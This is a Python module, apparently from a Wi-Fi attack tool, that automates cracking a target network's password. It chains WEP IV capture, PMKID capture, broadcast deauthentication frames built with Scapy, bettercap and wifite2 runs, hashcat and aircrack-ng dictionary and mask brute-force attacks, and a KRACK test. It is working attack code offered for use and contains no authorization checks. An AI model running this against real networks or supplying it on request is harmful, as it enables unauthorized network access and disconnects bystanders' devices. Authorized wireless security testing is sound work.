"""Unified attack orchestrator — tries all applicable methods in sequence.

Runs in a background thread.  Progress is reported via log_cb(message, level)
and the final result via result_cb(password_or_None).
"""

import subprocess
import threading
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, List, Optional

from .system import (
    IS_WINDOWS,
    check_tool,
    enable_monitor_mode,
    disable_monitor_mode,
    get_hashcat_dir,
    get_npcap_device_name,
    kill_interfering_processes,
    restart_wlansvc,
    set_channel_windows,
)
from . import aircrack, hashcat_tool, hcx, krack as krack_tool, wifite as wifite_tool

# Hashcat mask attack patterns tried when no wordlist is set or wordlist is
# exhausted.  Ordered by likelihood — short digit strings cover PINs, dates,
# phone numbers and other common simple passwords.
_MASK_ATTACKS: List[tuple] = [
    # (label, mask)
    ("6-digit number",   "?d?d?d?d?d?d"),
    ("8-digit number",   "?d?d?d?d?d?d?d?d"),
    ("10-digit number",  "?d?d?d?d?d?d?d?d?d?d"),
    ("8-char lowercase", "?l?l?l?l?l?l?l?l"),
]


@dataclass
class AttackTarget:
    ssid: str
    bssid: str
    channel: int
    encryption: str  # e.g. "WPA2", "WEP", "WPA3", "WPA"


LogCallback = Callable[[str, str], None]          # (message, level)
ResultCallback = Callable[[Optional[str]], None]  # cracked_password or None

# Common wordlist locations to try automatically when no path is given
_COMMON_WORDLISTS: List[str] = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/dict/words",
]


def _search_wordlist(names: List[str]) -> Optional[str]:
    """Search common locations for the first matching wordlist filename."""
    import sys
    for base in [Path(sys.executable).parent, Path(__file__).parent.parent.parent]:
        for name in names:
            candidate = base / "wordlists" / name
            if candidate.exists():
                return str(candidate)
        # Also check bare repo root for convenience during development
        for name in names:
            candidate = base / name
            if candidate.exists():
                return str(candidate)
    return None


def find_default_wordlist() -> Optional[str]:
    """Return the WPA2-filtered wordlist (8-63 chars), or a generic fallback."""
    for path in _COMMON_WORDLISTS:
        if Path(path).exists():
            return path
    return _search_wordlist([
        "wifitool-wordlist-wpa2.txt",
        "wifitool-wordlist-full.txt",
        "rockyou.txt",
        "wordlist.txt",
    ])


def find_full_wordlist() -> Optional[str]:
    """Return the unfiltered wordlist (for WEP and other unconstrained protocols)."""
    return _search_wordlist([
        "wifitool-wordlist-full.txt",
        "wifitool-wordlist-wpa2.txt",
        "rockyou.txt",
        "wordlist.txt",
    ])


class UnifiedAttacker:
    """Tries every applicable attack against one target network."""

    CAPTURE_SECS = 60    # seconds per capture phase
    CRACK_TIMEOUT = 300  # seconds for hashcat/aircrack per phase

    def __init__(
        self,
        target: AttackTarget,
        interface: str,
        wordlist: Optional[str],
        output_dir: Path,
        log_cb: LogCallback,
        result_cb: ResultCallback,
    ) -> None:
        self.target = target
        self.interface = interface
        self.wordlist = wordlist or find_default_wordlist()
        self.output_dir = output_dir
        self._log = log_cb
        self._on_result = result_cb
        self._stop = threading.Event()
        self._current_proc: Optional[subprocess.Popen] = None
        self._monitor_iface: Optional[str] = None
        # Interface name for external capture tools (airodump-ng, aireplay-ng,
        # bettercap, wifite).  On Windows this is the friendly name returned by
        # WlanHelper ("Wi-Fi 2") — NOT the Npcap device path.
        self._cap_iface: Optional[str] = None
        # Npcap device path (\Device\NPF_{GUID}) for Python/Scapy capture.
        # Resolved before wlansvc is stopped (netsh needs wlansvc running).
        self._scapy_iface: Optional[str] = None

    def stop(self) -> None:
        """Signal the attacker to stop and kill any running subprocess."""
        self._stop.set()
        proc = self._current_proc
        if proc is not None:
            try:
                proc.terminate()
            except Exception:
                pass

    def run(self) -> None:
        """Main attack sequence — call this from a background thread."""
        self.output_dir.mkdir(parents=True, exist_ok=True)
        enc = self.target.encryption.upper()
        password: Optional[str] = None

        self._wlansvc_stopped = False
        try:
            # Resolve the Npcap device path BEFORE stopping wlansvc because
            # netsh wlan show interfaces requires wlansvc to be running.
            # This path is used by Python/Scapy capture (pcap_utils).
            npcap_dev = get_npcap_device_name(self.interface) if IS_WINDOWS else None
            if npcap_dev:
                self._log(f"Npcap device: {npcap_dev}", "info")
            self._scapy_iface = npcap_dev or self.interface
            # Default cap_iface to original interface name; overridden below
            # once monitor mode resolves the actual capture interface name.
            self._cap_iface = self.interface

            # Enable monitor mode FIRST — on Windows, WlanHelper needs the
            # WLAN AutoConfig service (wlansvc) running to talk to the WLAN API.
            # Stopping wlansvc before this call causes myGUIDFromString errors.
            self._log("Enabling monitor mode...", "info")
            ok, result = enable_monitor_mode(self.interface)
            if not ok:
                # Error code 50 = ERROR_NOT_SUPPORTED — the adapter driver does
                # not support monitor mode at all; retrying will always fail.
                if "error code = 50" in result or "not supported" in result.lower():
                    self._log(f"Monitor mode not supported by this adapter: {result}", "warn")
                    self._log(
                        "Adapter driver does not support monitor mode on Windows. "
                        "For best results use a dedicated USB adapter (e.g. Alfa AWUS036ACH) "
                        "with Npcap 802.11 monitor mode support.",
                        "warn",
                    )
                else:
                    self._log(f"Monitor mode failed: {result}", "warn")
                    self._log("Retrying monitor mode...", "info")
                    time.sleep(2)
                    ok, result = enable_monitor_mode(self.interface)
            if ok:
                self._monitor_iface = result
                # Use the exact interface name that WlanHelper/airmon-ng returned
                # for ALL external capture tools on every platform.
                # On Windows this is the friendly name ("Wi-Fi 2") that
                # airodump-ng and aireplay-ng accept — NOT the Npcap device path.
                self._cap_iface = result
                self._log(f"Monitor mode active: {result}", "success")
            else:
                self._monitor_iface = self.interface
                if "error code = 50" not in result and "not supported" not in result.lower():
                    self._log(f"Monitor mode failed: {result}", "warn")
                self._log("Continuing in managed mode (capture may fail)", "warn")

            # Lock the adapter to the target AP's channel BEFORE stopping wlansvc.
            # WlanHelper needs wlansvc running to talk to the WLAN API.
            # Without this, Scapy sniffs on whatever channel the adapter was last
            # on and captures nothing from the target AP.
            if IS_WINDOWS and self.target.channel:
                ch_ok, ch_msg = set_channel_windows(self._cap_iface, self.target.channel)
                if ch_ok:
                    self._log(f"Channel locked to {self.target.channel}", "info")
                else:
                    self._log(
                        f"Channel lock failed (capture may miss packets): {ch_msg}", "warn"
                    )

            # Log which wordlist will be used so it's visible in the attack log.
            if self.wordlist:
                self._log(f"Wordlist: {Path(self.wordlist).name}", "info")
            else:
                self._log(
                    "No wordlist found — mask attacks only "
                    "(8-digit, 6-digit, 10-digit numbers; 8-char lowercase)",
                    "warn",
                )

            # NOW stop processes that compete for the adapter during capture.
            # wlansvc holds the NIC in managed mode and interferes with raw
            # 802.11 capture tools (airodump-ng, hcxdumptool).
            self._log("Stopping interfering processes...", "info")
            kill_output = kill_interfering_processes()
            if kill_output:
                self._log(kill_output, "output")
            if IS_WINDOWS and kill_output and "stopped successfully" in kill_output.lower():
                self._wlansvc_stopped = True

            if self._stop.is_set():
                self._on_result(None)
                return

            # Route by encryption type
            if "WEP" in enc:
                password = self._phase_wep()
                # Wifite2 as fallback for WEP (Linux only)
                if not password and not self._stop.is_set():
                    password = self._phase_wifite()
            else:
                # 1. PMKID (clientless — no associated client required)
                if not self._stop.is_set() and check_tool("hashcat"):
                    password = self._phase_pmkid()
                # 2. 4-Way handshake + dictionary (airodump-ng + deauth)
                if not password and not self._stop.is_set():
                    password = self._phase_handshake()
                # 3. Bettercap handshake capture (alternative capture path)
                if not password and not self._stop.is_set():
                    password = self._phase_bettercap()
                # 4. Wifite2 automated auditor — also covers WPS (Linux only)
                if not password and not self._stop.is_set():
                    password = self._phase_wifite()
                # 5. KRACK vulnerability assessment (result logged, no password)
                if not self._stop.is_set():
                    self._phase_krack()

        finally:
            # On Windows, restart wlansvc before calling WlanHelper to restore
            # managed mode — WlanHelper requires the WLAN API (wlansvc) running.
            if IS_WINDOWS and self._wlansvc_stopped:
                svc_out = restart_wlansvc()
                if svc_out:
                    self._log(svc_out, "output")
            if self._monitor_iface and self._monitor_iface != self.interface:
                disable_monitor_mode(self._monitor_iface)
                self._log("Monitor mode disabled", "info")

        self._on_result(password)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _stream(
        self,
        cmd: List[str],
        timeout: Optional[int] = None,
        cwd: Optional[str] = None,
    ) -> int:
        """Spawn *cmd*, stream stdout+stderr to log_cb, return exit code."""
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                cwd=cwd,
            )
        except FileNotFoundError:
            self._log(f"Command not found: {cmd[0]}", "error")
            return 1
        except Exception as exc:
            self._log(str(exc), "error")
            return 1

        self._current_proc = proc
        deadline = time.monotonic() + timeout if timeout else None

        for line in iter(proc.stdout.readline, ""):
            if self._stop.is_set() or (deadline and time.monotonic() > deadline):
                proc.terminate()
                break
            text = line.rstrip()
            if text:
                self._log(text, "output")

        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        self._current_proc = None
        return proc.returncode

    def _prefix(self, name: str) -> str:
        return str(self.output_dir / name)

    def _crack_with_masks(self, hash_file: str, mode: int) -> Optional[str]:
        """Try hashcat mask (brute-force) attacks for common password patterns.

        Used as a fallback when no wordlist is set or the wordlist is
        exhausted.  Covers PINs, dates, phone numbers, and short alphabetic
        passwords without requiring any external file.
        """
        if not check_tool("hashcat"):
            return None
        for label, mask in _MASK_ATTACKS:
            if self._stop.is_set():
                break
            self._log(f"Mask attack: {label} ({mask})...", "info")
            self._stream(
                [
                    "hashcat", "-a", "3", "-m", str(mode),
                    hash_file, mask, "--force", "--quiet",
                ],
                timeout=self.CRACK_TIMEOUT,
                cwd=get_hashcat_dir(),
            )
            if self._stop.is_set():
                break
            ok, out = hashcat_tool.show_cracked(hash_file, mode)
            if ok and out.strip():
                password = out.strip().split(":")[-1]
                self._log(f"Mask attack cracked ({label}) -- password: {password}", "success")
                return password
        return None

    # ------------------------------------------------------------------
    # Phase: WEP
    # ------------------------------------------------------------------

    def _phase_wep(self) -> Optional[str]:
        self._log("--- Phase: WEP Attack (PTW/FMS) ---", "phase")

        if not check_tool("airodump-ng"):
            self._log("airodump-ng not found -- skipping WEP", "warn")
            return None

        prefix = self._prefix("wep_cap")
        secs = self.CAPTURE_SECS * 2
        self._log(f"Capturing IVs from '{self.target.ssid}' for {secs}s...", "info")

        self._stream(
            [
                "airodump-ng",
                "-c", str(self.target.channel),
                "--bssid", self.target.bssid,
                "-w", prefix,
                "--output-format", "pcap",
                self._cap_iface,
            ],
            timeout=secs,
        )

        if self._stop.is_set():
            return None

        caps = sorted(self.output_dir.glob("wep_cap*.cap"))
        if not caps:
            self._log("No WEP capture file produced", "error")
            return None

        self._log("Running aircrack-ng PTW/FMS statistical crack...", "info")
        ok, output, key = aircrack.crack_wep(str(caps[-1]))
        if key:
            self._log(f"WEP key: {key}", "success")
            return key

        self._log("WEP crack failed -- not enough IVs or wrong key space", "warn")

        # Dictionary fallback: try the full (unfiltered) wordlist against the capture.
        # aircrack-ng -w wordlist also works on WEP .cap files.
        wl = find_full_wordlist() or self.wordlist
        if wl and not self._stop.is_set():
            self._log(f"Trying dictionary attack on WEP capture: {Path(wl).name}", "info")
            ok, _, key = aircrack.crack_wpa(
                str(caps[-1]), wl,
                bssid=self.target.bssid, ssid=self.target.ssid,
            )
            if key:
                self._log(f"WEP dictionary crack succeeded -- key: {key}", "success")
                return key
            self._log("WEP dictionary attack exhausted wordlist", "warn")

        return None

    # ------------------------------------------------------------------
    # Phase: PMKID (clientless WPA2)
    # ------------------------------------------------------------------

    def _phase_pmkid(self) -> Optional[str]:
        self._log("--- Phase: PMKID Attack (clientless) ---", "phase")

        if not self.wordlist:
            self._log("No wordlist configured -- skipping PMKID crack", "warn")

        cap_file = self._prefix("pmkid.pcapng")
        hash_file = self._prefix("pmkid.hc22000")

        self._log(f"Capturing PMKID frames for {self.CAPTURE_SECS}s...", "info")

        if IS_WINDOWS and not check_tool("hcxdumptool"):
            done = threading.Event()

            def _win_cap() -> None:
                from .pcap_utils import capture_pmkid_eapol
                try:
                    capture_pmkid_eapol(
                        self._scapy_iface, cap_file,
                        bssid_filter=self.target.bssid,
                        timeout=self.CAPTURE_SECS,
                    )
                finally:
                    done.set()

            t = threading.Thread(target=_win_cap, daemon=True)
            t.start()
            done.wait(timeout=self.CAPTURE_SECS)
        else:
            if not check_tool("hcxdumptool"):
                self._log("hcxdumptool not found -- skipping PMKID", "warn")
                return None

            import os as _os, tempfile as _tf
            tmp = _tf.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            tmp.write(self.target.bssid.replace(":", "").lower() + "\n")
            tmp.close()

            self._stream(
                [
                    "hcxdumptool", "-i", self._cap_iface,
                    "-o", cap_file, "--enable_status=3",
                    f"--filterlist_ap={tmp.name}", "--filtermode=2",
                ],
                timeout=self.CAPTURE_SECS,
            )
            _os.unlink(tmp.name)

        if self._stop.is_set():
            return None

        cap_path = Path(cap_file)
        if not cap_path.exists() or cap_path.stat().st_size == 0:
            self._log("No PMKID data captured", "warn")
            return None

        self._log("Converting capture to hc22000 format...", "info")
        ok, msg = hcx.convert_to_hashcat(cap_file, hash_file)
        hash_path = Path(hash_file)
        if not ok or not hash_path.exists() or hash_path.stat().st_size == 0:
            self._log(f"Conversion: {msg or 'no hashes extracted'}", "warn")
            return None

        if not self.wordlist:
            self._log("No wordlist -- running mask attacks on PMKID hashes...", "info")
            return self._crack_with_masks(hash_file, 22801)

        self._log(f"hashcat -m 22801 | wordlist: {Path(self.wordlist).name}", "info")
        self._stream(
            ["hashcat", "-m", "22801", hash_file, self.wordlist, "--force", "--quiet"],
            timeout=self.CRACK_TIMEOUT,
            cwd=get_hashcat_dir(),
        )

        if self._stop.is_set():
            return None

        ok, out = hashcat_tool.show_cracked(hash_file, 22801)
        if ok and out.strip():
            password = out.strip().split(":")[-1]
            self._log(f"PMKID cracked -- password: {password}", "success")
            return password

        self._log("PMKID wordlist exhausted -- trying mask attacks...", "warn")
        return self._crack_with_masks(hash_file, 22801)

    # ------------------------------------------------------------------
    # Phase: WPA/WPA2 4-Way Handshake
    # ------------------------------------------------------------------

    def _phase_handshake(self) -> Optional[str]:
        self._log("--- Phase: WPA/WPA2 Handshake Attack ---", "phase")

        cap_file = self._prefix("hs_cap.pcap")
        hash_file = self._prefix("hs.hc22000")

        if IS_WINDOWS:
            # On Windows, airodump-ng fails because it calls the WLAN API at
            # init time but wlansvc has been stopped.  Use scapy + Npcap instead.
            return self._phase_handshake_windows(cap_file, hash_file)

        # --- Linux path: airodump-ng ---
        if not check_tool("airodump-ng"):
            self._log("airodump-ng not found -- skipping handshake capture", "warn")
            return None

        prefix = self._prefix("hs_cap")

        self._log(
            f"Starting capture on '{self.target.ssid}' for {self.CAPTURE_SECS}s...", "info"
        )

        cap_proc = subprocess.Popen(
            [
                "airodump-ng",
                "-c", str(self.target.channel),
                "--bssid", self.target.bssid,
                "-w", prefix,
                "--output-format", "pcap",
                self._cap_iface,
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        self._current_proc = cap_proc

        time.sleep(5)

        if not self._stop.is_set() and check_tool("aireplay-ng"):
            self._log("Sending deauth frames to force client reconnection...", "info")
            ok, msg = aircrack.deauth(
                self._cap_iface, self.target.bssid, count=10
            )
            self._log(
                "Deauth sent" if ok else f"Deauth: {msg}",
                "info" if ok else "warn",
            )

        remaining = self.CAPTURE_SECS - 5
        self._log(f"Waiting up to {remaining}s for 4-way handshake...", "info")
        for _ in range(remaining):
            if self._stop.is_set():
                break
            time.sleep(1)

        cap_proc.terminate()
        try:
            # Drain remaining output so we can log any airodump-ng errors
            remaining_out, _ = cap_proc.communicate(timeout=5)
            for line in (remaining_out or "").splitlines():
                if line.strip():
                    self._log(line.strip(), "output")
        except subprocess.TimeoutExpired:
            cap_proc.kill()
        self._current_proc = None

        if self._stop.is_set():
            return None

        caps = sorted(
            list(self.output_dir.glob("hs_cap*.cap"))
            + list(self.output_dir.glob("hs_cap*.pcap"))
        )
        if not caps:
            self._log("No handshake capture file found", "error")
            return None

        cap_file = str(caps[-1])
        has_hs, _ = aircrack.check_handshake(cap_file)
        self._log(
            "Handshake captured!" if has_hs
            else "No handshake detected -- attempting crack anyway...",
            "success" if has_hs else "warn",
        )

        # Try hashcat first (faster with GPU)
        if check_tool("hashcat") and self.wordlist:
            ok, _ = hashcat_tool.convert_pcap(cap_file, hash_file)
            hash_path = Path(hash_file)
            if ok and hash_path.exists() and hash_path.stat().st_size > 0:
                self._log(
                    f"hashcat -m 22000 | wordlist: {Path(self.wordlist).name}", "info"
                )
                self._stream(
                    [
                        "hashcat", "-m", "22000", hash_file, self.wordlist,
                        "--force", "--quiet",
                    ],
                    timeout=self.CRACK_TIMEOUT,
                    cwd=get_hashcat_dir(),
                )
                if not self._stop.is_set():
                    ok, out = hashcat_tool.show_cracked(hash_file, 22000)
                    if ok and out.strip():
                        password = out.strip().split(":")[-1]
                        self._log(
                            f"Handshake cracked (hashcat) -- password: {password}", "success"
                        )
                        return password

        # Fallback: aircrack-ng CPU dictionary attack
        if check_tool("aircrack-ng") and self.wordlist and not self._stop.is_set():
            self._log("Falling back to aircrack-ng dictionary attack...", "info")
            ok, _, key = aircrack.crack_wpa(
                cap_file,
                self.wordlist,
                bssid=self.target.bssid,
                ssid=self.target.ssid,
            )
            if key:
                self._log(
                    f"Handshake cracked (aircrack) -- password: {key}", "success"
                )
                return key

        self._log("Handshake wordlist exhausted -- trying mask attacks...", "warn")
        return self._crack_with_masks(hash_file, 22000)

    # ------------------------------------------------------------------
    # Phase: WPA/WPA2 Handshake (Windows — Scapy/Npcap capture)
    # ------------------------------------------------------------------

    def _phase_handshake_windows(self, cap_file: str, hash_file: str) -> Optional[str]:
        """Windows replacement for airodump-ng: capture via Scapy + Npcap."""
        from .pcap_utils import capture_pmkid_eapol, convert_pcap_to_hc22000

        self._log(
            f"Starting Scapy/Npcap capture on '{self.target.ssid}' "
            f"for {self.CAPTURE_SECS}s...",
            "info",
        )

        # Run capture in a thread so we can send deauth while it runs
        cap_exc: list = []

        def _do_cap() -> None:
            try:
                capture_pmkid_eapol(
                    self._scapy_iface,
                    cap_file,
                    bssid_filter=self.target.bssid,
                    timeout=self.CAPTURE_SECS,
                )
            except Exception as exc:
                cap_exc.append(exc)

        cap_thread = threading.Thread(target=_do_cap, daemon=True)
        cap_thread.start()

        # Wait briefly then send deauth to accelerate handshake
        time.sleep(5)
        if not self._stop.is_set():
            self._log("Sending Scapy deauth frames to force client reconnection...", "info")
            try:
                import scapy.all as sc
                # On Windows, sendp() requires a NetworkInterface object rather than
                # a raw NPF path string (\Device\NPF_{GUID}).  Resolve it from
                # conf.ifaces; fall back to the string if not found.
                iface_for_send = self._scapy_iface
                try:
                    for _iface_obj in sc.conf.ifaces.values():
                        _pcap = (
                            getattr(_iface_obj, "pcap_name", "")
                            or getattr(_iface_obj, "network_name", "")
                        )
                        if _pcap and _pcap.lower() == self._scapy_iface.lower():
                            iface_for_send = _iface_obj
                            break
                except Exception:
                    pass
                dot11 = sc.Dot11(
                    type=0, subtype=12,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=self.target.bssid,
                    addr3=self.target.bssid,
                )
                frame = sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7)
                sc.sendp(frame, iface=iface_for_send, count=10, inter=0.1, verbose=False)
                self._log("Deauth frames sent", "info")
            except Exception as exc:
                self._log(f"Deauth failed (non-fatal): {exc}", "warn")

        # Wait for capture to finish (or stop signal)
        cap_thread.join(timeout=self.CAPTURE_SECS + 10)

        if self._stop.is_set():
            return None

        if cap_exc:
            self._log(f"Capture error: {cap_exc[0]}", "error")
            return None

        if not Path(cap_file).exists() or Path(cap_file).stat().st_size == 0:
            self._log("No packets captured — no clients seen or handshake not triggered", "warn")
            return None

        # Convert pcap → hc22000
        ok, msg = convert_pcap_to_hc22000(cap_file, hash_file)
        self._log(msg, "success" if ok else "warn")
        if not ok:
            return None

        has_hs, _ = aircrack.check_handshake(cap_file)
        self._log(
            "Handshake confirmed!" if has_hs else "Attempting crack on captured data...",
            "success" if has_hs else "info",
        )

        # Try hashcat first (faster with GPU)
        if check_tool("hashcat") and self.wordlist:
            hash_path = Path(hash_file)
            if hash_path.exists() and hash_path.stat().st_size > 0:
                self._log(
                    f"hashcat -m 22000 | wordlist: {Path(self.wordlist).name}", "info"
                )
                self._stream(
                    [
                        "hashcat", "-m", "22000", hash_file, self.wordlist,
                        "--force", "--quiet",
                    ],
                    timeout=self.CRACK_TIMEOUT,
                    cwd=get_hashcat_dir(),
                )
                if not self._stop.is_set():
                    ok2, out = hashcat_tool.show_cracked(hash_file, 22000)
                    if ok2 and out.strip():
                        password = out.strip().split(":")[-1]
                        self._log(
                            f"Handshake cracked (hashcat) -- password: {password}", "success"
                        )
                        return password

        # Fallback: aircrack-ng CPU dictionary attack (uses cap file)
        if check_tool("aircrack-ng") and self.wordlist and not self._stop.is_set():
            self._log("Falling back to aircrack-ng dictionary attack...", "info")
            ok3, _, key = aircrack.crack_wpa(
                cap_file, self.wordlist,
                bssid=self.target.bssid, ssid=self.target.ssid,
            )
            if key:
                self._log(
                    f"Handshake cracked (aircrack) -- password: {key}", "success"
                )
                return key

        self._log("Handshake wordlist exhausted -- trying mask attacks...", "warn")
        return self._crack_with_masks(hash_file, 22000)

    # ------------------------------------------------------------------
    # Phase: Bettercap handshake capture
    # ------------------------------------------------------------------

    def _phase_bettercap(self) -> Optional[str]:
        self._log("--- Phase: Bettercap Handshake Capture ---", "phase")

        if not check_tool("bettercap"):
            self._log("bettercap not found -- skipping", "warn")
            return None

        cap_file = self._prefix("bettercap_hs.pcap")
        hash_file = self._prefix("bettercap_hs.hc22000")

        self._log(f"Capturing handshake via bettercap on '{self.target.ssid}'...", "info")

        # Script bettercap: save handshakes, recon on, deauth target, wait, quit
        eval_cmds = (
            f"set wifi.handshakes.file {cap_file}; "
            f"wifi.recon on; "
            f"sleep 5; "
            f"wifi.deauth {self.target.bssid}; "
            f"sleep {self.CAPTURE_SECS - 5}; "
            f"quit"
        )
        self._stream(
            ["bettercap", "-iface", self._cap_iface, "-eval", eval_cmds],
            timeout=self.CAPTURE_SECS + 15,
        )

        if self._stop.is_set():
            return None

        if not Path(cap_file).exists() or Path(cap_file).stat().st_size == 0:
            self._log("Bettercap produced no capture data", "warn")
            return None

        if not self.wordlist:
            self._log("No wordlist -- skipping crack of bettercap capture", "warn")
            return None

        # Crack with hashcat, then aircrack-ng fallback
        ok, _ = hashcat_tool.convert_pcap(cap_file, hash_file)
        hash_path = Path(hash_file)
        if check_tool("hashcat") and ok and hash_path.exists() and hash_path.stat().st_size > 0:
            self._log(f"hashcat -m 22000 on bettercap capture...", "info")
            self._stream(
                ["hashcat", "-m", "22000", hash_file, self.wordlist, "--force", "--quiet"],
                timeout=self.CRACK_TIMEOUT,
                cwd=get_hashcat_dir(),
            )
            if not self._stop.is_set():
                ok, out = hashcat_tool.show_cracked(hash_file, 22000)
                if ok and out.strip():
                    password = out.strip().split(":")[-1]
                    self._log(f"Bettercap capture cracked -- password: {password}", "success")
                    return password

        if check_tool("aircrack-ng") and not self._stop.is_set():
            self._log("aircrack-ng dictionary attack on bettercap capture...", "info")
            ok, _, key = aircrack.crack_wpa(
                cap_file, self.wordlist,
                bssid=self.target.bssid, ssid=self.target.ssid,
            )
            if key:
                self._log(f"Bettercap capture cracked (aircrack) -- password: {key}", "success")
                return key

        self._log("Bettercap capture exhausted wordlist", "warn")
        return None

    # ------------------------------------------------------------------
    # Phase: Wifite2 automated auditor
    # ------------------------------------------------------------------

    def _phase_wifite(self) -> Optional[str]:
        self._log("--- Phase: Wifite2 Automated Attack ---", "phase")

        if not wifite_tool.is_available():
            self._log(
                "wifite not available (Linux only, requires airmon-ng) -- skipping", "warn"
            )
            return None

        if not self.wordlist:
            self._log("No wordlist -- wifite will attempt WPS/PMKID only", "warn")

        self._log(f"Running wifite2 against '{self.target.ssid}'...", "info")
        self._log("wifite manages its own capture and cracking", "info")

        cmd = [
            wifite_tool._find_wifite(),
            "--interface", self._cap_iface,
            "--bssid", self.target.bssid,
            "--channel", str(self.target.channel),
            "--kill",
            "--no-wps",         # handled separately if needed
            "--wpa",
        ]
        if self.wordlist:
            cmd += ["--dict", self.wordlist]

        password: Optional[str] = None

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            self._current_proc = proc
            deadline = time.monotonic() + self.CAPTURE_SECS * 3

            for line in iter(proc.stdout.readline, ""):
                if self._stop.is_set() or time.monotonic() > deadline:
                    proc.terminate()
                    break
                text = line.rstrip()
                if text:
                    self._log(text, "output")
                # Parse wifite2 cracked-password output
                low = text.lower()
                if "cracked" in low or "key found" in low:
                    # Formats: "cracked <SSID> (<password>)" or "password: <pw>"
                    for marker in ("password:", "cracked", "("):
                        idx = low.find(marker)
                        if idx != -1:
                            candidate = text[idx + len(marker):].strip().strip("()").strip()
                            if candidate and " " not in candidate:
                                password = candidate
                                self._log(f"wifite2 cracked -- password: {password}", "success")
                                proc.terminate()
                                break

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            self._current_proc = None

        except Exception as exc:
            self._log(str(exc), "error")

        if not password:
            self._log("wifite2 did not find password", "warn")
        return password

    # ------------------------------------------------------------------
    # Phase: KRACK vulnerability assessment
    # ------------------------------------------------------------------

    def _phase_krack(self) -> None:
        self._log("--- Phase: KRACK Vulnerability Assessment ---", "phase")

        if IS_WINDOWS:
            self._log("KRACK test requires hostapd/wpa_supplicant (Linux only) -- skipping", "warn")
            return

        deps = krack_tool.check_dependencies()
        missing = [k for k, v in deps.items() if not v]
        if missing:
            self._log(f"KRACK dependencies missing: {', '.join(missing)} -- skipping", "warn")
            return

        script = krack_tool.find_script()
        if script is None:
            self._log("krackattacks-scripts not found -- attempting clone...", "info")
            ok, msg = krack_tool.clone_repo()
            if not ok:
                self._log(f"Clone failed: {msg}", "warn")
                return
            self._log("Cloned krackattacks-scripts", "success")
            krack_tool.install_requirements()
            script = krack_tool.find_script()

        if script is None:
            self._log("KRACK test script still not found -- skipping", "warn")
            return

        self._log(f"Running KRACK test against {self.target.bssid}...", "info")
        self._log("(Tests whether the AP is vulnerable to CVE-2017-13077+)", "info")

        self._stream(
            [__import__("sys").executable, script, self._cap_iface, self.target.bssid],
            timeout=120,
        )
